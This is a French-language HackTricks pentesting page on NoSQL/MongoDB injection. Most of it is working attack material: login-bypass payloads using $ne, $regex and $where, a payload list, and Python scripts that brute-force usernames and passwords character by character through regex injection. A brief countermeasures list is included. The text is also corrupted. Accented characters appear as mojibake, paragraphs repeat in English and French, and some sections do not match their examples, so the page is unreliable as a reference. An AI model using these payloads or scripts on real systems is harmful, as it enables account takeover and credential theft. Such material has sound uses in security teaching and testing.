# Injection NoSQL

![](<../.gitbook/assets/image (9) (1) (2).png>)

Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et automatiser facilement des flux de travail aliment√©s par les outils communautaires les plus avanc√©s au monde.\
Obtenez l'acc√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

Les bases de donn√©es NoSQL offrent des restrictions de coh√©rence plus l√¢ches que les bases de donn√©es SQL traditionnelles. En n√©cessitant moins de contraintes relationnelles et de v√©rifications de coh√©rence, les bases de donn√©es NoSQL offrent souvent des avantages de performance et de mise √† l'√©chelle. Cependant, ces bases de donn√©es sont toujours potentiellement vuln√©rables aux attaques par injection, m√™me si elles n'utilisent pas la syntaxe SQL traditionnelle.

## Exploitation

En PHP, vous pouvez envoyer un tableau en changeant le param√®tre envoy√© de _parameter=foo_ √† _parameter\[arrName]=foo._

Les exploits sont bas√©s sur l'ajout d'un **op√©rateur** :
```bash
username[$ne]=1$password[$ne]=1 #<Not Equals>
username[$regex]=^adm$password[$ne]=1 #Check a <regular expression>, could be used to brute-force a parameter
username[$regex]=.{25}&pass[$ne]=1 #Use the <regex> to find the length of a value
username[$eq]=admin&password[$ne]=1 #<Equals>
username[$ne]=admin&pass[$lt]=s #<Less than>, Brute-force pass[$lt] to find more users
username[$ne]=admin&pass[$gt]=s #<Greater Than>
username[$nin][admin]=admin&username[$nin][test]=test&pass[$ne]=7 #<Matches non of the values of the array> (not test and not admin)
{ $where: "this.credits == this.debits" }#<IF>, can be used to execute code
```
### Contournement de l'authentification de base

**En utilisant la n√©gation ($ne) ou la sup√©riorit√© ($gt)**
```bash
#in URL
username[$ne]=toto&password[$ne]=toto
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true

#in JSON
{"username": {"$ne": null}, "password": {"$ne": null} }
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"} }
{"username": {"$gt": undefined}, "password": {"$gt": undefined} }
```
### **SQL - Mongo**

MongoDB est une base de donn√©es NoSQL tr√®s populaire. Contrairement aux bases de donn√©es SQL traditionnelles, MongoDB stocke les donn√©es sous forme de documents JSON. Les injections NoSQL sont similaires aux injections SQL, mais elles exploitent les diff√©rences de syntaxe et de structure de MongoDB.

#### **Injection basique**

La technique d'injection de base consiste √† ajouter une cl√© suppl√©mentaire √† la requ√™te JSON. Par exemple, si la requ√™te est la suivante :

```
db.users.find({username: "admin", password: "password123"})
```

Nous pouvons ajouter une cl√© suppl√©mentaire pour contourner l'authentification :

```
db.users.find({username: "admin", password: {"$ne": ""}})
```

Cela renverra tous les documents o√π le champ "password" n'est pas vide.

#### **Injection d'op√©rateurs**

MongoDB utilise des op√©rateurs pour effectuer des op√©rations sur les donn√©es. Les injections d'op√©rateurs consistent √† utiliser des op√©rateurs malveillants pour contourner les contr√¥les d'acc√®s. Par exemple, si la requ√™te est la suivante :

```
db.users.find({username: "admin"})
```

Nous pouvons utiliser l'op√©rateur "$regex" pour contourner la v√©rification du nom d'utilisateur :

```
db.users.find({username: {"$regex": ".*"}, password: {"$ne": ""}})
```

Cela renverra tous les documents o√π le champ "password" n'est pas vide, ind√©pendamment du nom d'utilisateur.

#### **Injection de code**

MongoDB prend en charge l'ex√©cution de code c√¥t√© serveur √† l'aide de la fonction "eval". Les injections de code consistent √† injecter du code malveillant dans la requ√™te pour qu'il soit ex√©cut√© c√¥t√© serveur. Par exemple, si la requ√™te est la suivante :

```
db.users.find({username: "admin"})
```

Nous pouvons utiliser la fonction "eval" pour ex√©cuter du code malveillant :

```
db.users.find({$where: "this.username == 'admin' && this.password.match(/^pa.*/)"})
```

Cela renverra tous les documents o√π le nom d'utilisateur est "admin" et le mot de passe commence par "pa".
```
Normal sql: ' or 1=1-- -
Mongo sql: ' || 1==1//    or    ' || 1==1%00
```
### Extraire des informations sur la **longueur**
```bash
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
# True if the length equals 1,3...
```
### Extraire des informations sur les **donn√©es**
```
in URL (if length == 3)
username[$ne]=toto&password[$regex]=a.{2}
username[$ne]=toto&password[$regex]=b.{2}
...
username[$ne]=toto&password[$regex]=m.{2}
username[$ne]=toto&password[$regex]=md.{1}
username[$ne]=toto&password[$regex]=mdp

username[$ne]=toto&password[$regex]=m.*
username[$ne]=toto&password[$regex]=md.*

in JSON
{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
```
### **SQL - Mongo**

### Injection NoSQL

L'injection NoSQL est similaire √† l'injection SQL, mais elle est utilis√©e pour les bases de donn√©es NoSQL telles que MongoDB. Les attaques NoSQL Injection sont souvent plus difficiles √† exploiter que les attaques SQL Injection, car les bases de donn√©es NoSQL n'utilisent pas de langage de requ√™te structur√© tel que SQL. Cependant, les attaquants peuvent toujours exploiter les vuln√©rabilit√©s de s√©curit√© dans les applications qui utilisent des bases de donn√©es NoSQL pour extraire des informations sensibles ou effectuer des actions malveillantes.

### Syntaxe de base

La syntaxe de base de l'injection NoSQL est similaire √† celle de l'injection SQL. Les attaquants peuvent utiliser des caract√®res sp√©ciaux pour modifier la requ√™te d'origine et extraire des informations sensibles. Par exemple, si une application utilise MongoDB pour stocker des informations d'utilisateur, un attaquant peut utiliser la syntaxe suivante pour extraire toutes les informations d'utilisateur de la base de donn√©es :

```
username: {$ne: ''}, password: {$ne: ''}
```

Cette syntaxe utilise l'op√©rateur `$ne` pour extraire toutes les informations d'utilisateur qui ne sont pas vides. L'attaquant peut √©galement utiliser d'autres op√©rateurs tels que `$gt`, `$lt`, `$gte`, `$lte`, `$regex`, etc. pour extraire des informations sensibles.

### Contre-mesures

Les contre-mesures suivantes peuvent √™tre prises pour pr√©venir les attaques NoSQL Injection :

- Utiliser des biblioth√®ques de requ√™tes NoSQL s√©curis√©es qui √©chappent automatiquement les caract√®res sp√©ciaux.
- Valider et filtrer les entr√©es utilisateur pour emp√™cher les caract√®res sp√©ciaux d'√™tre utilis√©s dans les requ√™tes.
- Utiliser des r√¥les d'utilisateur et des autorisations pour limiter l'acc√®s aux bases de donn√©es et aux informations sensibles.
- Mettre √† jour r√©guli√®rement les biblioth√®ques et les frameworks utilis√©s pour √©viter les vuln√©rabilit√©s connues.
```
/?search=admin' && this.password%00 --> Check if the field password exists
/?search=admin' && this.password && this.password.match(/.*/)%00 --> start matching password
/?search=admin' && this.password && this.password.match(/^a.*$/)%00
/?search=admin' && this.password && this.password.match(/^b.*$/)%00
/?search=admin' && this.password && this.password.match(/^c.*$/)%00
...
/?search=admin' && this.password && this.password.match(/^duvj.*$/)%00
...
/?search=admin' && this.password && this.password.match(/^duvj78i3u$/)%00  Found
```
### Ex√©cution arbitraire de fonctions PHP

En utilisant l'op√©rateur **$func** de la biblioth√®que [MongoLite](https://github.com/agentejo/cockpit/tree/0.11.1/lib/MongoLite) (utilis√©e par d√©faut), il est possible d'ex√©cuter une fonction arbitraire comme dans [ce rapport](https://swarm.ptsecurity.com/rce-cockpit-cms/).
```python
"user":{"$func": "var_dump"}
```
![](<../.gitbook/assets/image (468).png>)

### Obtenir des informations √† partir de diff√©rentes collections

Il est possible d'utiliser [**$lookup**](https://www.mongodb.com/docs/manual/reference/operator/aggregation/lookup/) pour obtenir des informations √† partir d'une collection diff√©rente. Dans l'exemple suivant, nous lisons √† partir d'une **collection diff√©rente** appel√©e **`users`** et obtenons les **r√©sultats de toutes les entr√©es** avec un mot de passe correspondant √† un joker.
```json
[
  {
    "$lookup":{
      "from": "users",
      "as":"resultado","pipeline": [
        {
          "$match":{
            "password":{
              "$regex":"^.*"
            }
          }
        }
      ]
    }
  }
]
```
## Injection NoSQL aveugle

Blind NoSQL injection is a type of injection attack that targets NoSQL databases. It is similar to blind SQL injection, but instead of targeting SQL databases, it targets NoSQL databases. The attack is called "blind" because the attacker does not receive any error messages or other feedback from the database. This makes it more difficult to detect and exploit.

L'injection NoSQL aveugle est un type d'attaque par injection qui cible les bases de donn√©es NoSQL. Elle est similaire √† l'injection SQL aveugle, mais au lieu de cibler les bases de donn√©es SQL, elle cible les bases de donn√©es NoSQL. L'attaque est appel√©e "aveugle" car l'attaquant ne re√ßoit aucun message d'erreur ou autre retour d'information de la base de donn√©es. Cela rend plus difficile la d√©tection et l'exploitation de l'attaque.

### Boolean-based blind NoSQL injection

### Injection NoSQL aveugle bas√©e sur des bool√©ens

Boolean-based blind NoSQL injection is a technique that uses boolean-based queries to extract information from a NoSQL database. The attacker sends a query to the database that will return either true or false, depending on whether the query is successful or not. By sending a series of queries, the attacker can extract information from the database.

L'injection NoSQL aveugle bas√©e sur des bool√©ens est une technique qui utilise des requ√™tes bas√©es sur des bool√©ens pour extraire des informations d'une base de donn√©es NoSQL. L'attaquant envoie une requ√™te √† la base de donn√©es qui renverra soit vrai, soit faux, en fonction de la r√©ussite ou non de la requ√™te. En envoyant une s√©rie de requ√™tes, l'attaquant peut extraire des informations de la base de donn√©es.

### Time-based blind NoSQL injection

### Injection NoSQL aveugle bas√©e sur le temps

Time-based blind NoSQL injection is a technique that uses time delays to extract information from a NoSQL database. The attacker sends a query to the database that will cause a time delay if the query is successful. By measuring the time it takes for the database to respond, the attacker can extract information from the database.

L'injection NoSQL aveugle bas√©e sur le temps est une technique qui utilise des d√©lais de temps pour extraire des informations d'une base de donn√©es NoSQL. L'attaquant envoie une requ√™te √† la base de donn√©es qui provoquera un d√©lai de temps si la requ√™te est r√©ussie. En mesurant le temps qu'il faut √† la base de donn√©es pour r√©pondre, l'attaquant peut extraire des informations de la base de donn√©es.
```python
import requests, string

alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(21):
    print("[i] Looking for char number "+str(i+1))
    for char in alphabet:
        r = requests.get("http://chall.com?param=^"+flag+char)
        if ("<TRUE>" in r.text):
            flag += char
            print("[+] Flag: "+flag)
            break
```

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
            r = requests.post(u, data = {'ids': payload}, verify = False)
            if 'OK' in r.text:
                print("Found one more char : %s" % (password+c))
                password += c
```
## Charges MongoDB

### Payloads MongoDB

Les injections NoSQL sont souvent utilis√©es pour attaquer les bases de donn√©es MongoDB. Voici quelques exemples de charges utiles pour les injections NoSQL dans MongoDB:

#### R√©cup√©rer toutes les donn√©es de la base de donn√©es

```json
username[$ne]=&password[$ne]=
```

#### R√©cup√©rer les informations d'un utilisateur sp√©cifique

```json
username[$eq]=<username>&password[$ne]=1
```

#### R√©cup√©rer les informations d'un utilisateur en utilisant l'op√©rateur $regex

```json
username[$regex]=.*&password[$regex]=.*
```

#### R√©cup√©rer les informations d'un utilisateur en utilisant l'op√©rateur $where

```json
$where=return%20this.username%20==%20%22<username>%22%20&&%20this.password%20==%20%22<password>%22
```

#### R√©cup√©rer les informations d'un utilisateur en utilisant l'op√©rateur $where et une fonction JavaScript

```json
$where=function()%20{var%20x%20=%20new%20RegExp(%22<password>%22,%20%22i%22);%20return%20this.username%20==%20%22<username>%22%20&&%20x.test(this.password);}
```
```
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1'
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
|| 1==1
' && this.password.match(/.*/)//+%00
' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00
'%20%26%26%20this.passwordzz.match(/.*/)//+%00
{$gt: ''}
[$ne]=1
```
## Outils

* [https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration](https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration)
* [https://github.com/C4l1b4n/NoSQL-Attack-Suite](https://github.com/C4l1b4n/NoSQL-Attack-Suite)

### Brute-force des noms d'utilisateur et des mots de passe √† partir de la connexion POST

Il s'agit d'un script simple que vous pouvez modifier, mais les outils pr√©c√©dents peuvent √©galement effectuer cette t√¢che.
```python
import requests
import string

url = "http://example.com"
headers = {"Host": "exmaple.com"}
cookies = {"PHPSESSID": "s3gcsgtqre05bah2vt6tibq8lsdfk"}
possible_chars = list(string.ascii_letters) + list(string.digits) + ["\\"+c for c in string.punctuation+string.whitespace ]
def get_password(username):
    print("Extracting password of "+username)
    params = {"username":username, "password[$regex]":"", "login": "login"}
    password = "^"
    while True:
        for c in possible_chars:
            params["password[$regex]"] = password + c + ".*"
            pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
            if int(pr.status_code) == 302:
                password += c
                break
        if c == possible_chars[-1]:
            print("Found password "+password[1:].replace("\\", "")+" for username "+username)
            return password[1:].replace("\\", "")

def get_usernames():
    usernames = []
    params = {"username[$regex]":"", "password[$regex]":".*", "login": "login"}
    for c in possible_chars:
        username = "^" + c
        params["username[$regex]"] = username + ".*"
        pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
        if int(pr.status_code) == 302:
            print("Found username starting with "+c)
            while True:
                for c2 in possible_chars:
                    params["username[$regex]"] = username + c2 + ".*"
                    if int(requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False).status_code) == 302:
                        username += c2
                        print(username)
                        break

                if c2 == possible_chars[-1]:
                    print("Found username: "+username[1:])
                    usernames.append(username[1:])
                    break
    return usernames


for u in get_usernames():
    get_password(u)
```
## R√©f√©rences

* [https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L\_2uGJGU7AVNRcqRvEi%2Fuploads%2Fgit-blob-3b49b5d5a9e16cb1ec0d50cb1e62cb60f3f9155a%2FEN-NoSQL-No-injection-Ron-Shulman-Peleg-Bronshtein-1.pdf?alt=media](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L\_2uGJGU7AVNRcqRvEi%2Fuploads%2Fgit-blob-3b49b5d5a9e16cb1ec0d50cb1e62cb60f3f9155a%2FEN-NoSQL-No-injection-Ron-Shulman-Peleg-Bronshtein-1.pdf?alt=media)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et **automatiser facilement des workflows** aliment√©s par les outils communautaires les plus avanc√©s au monde.\
Obtenez l'acc√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
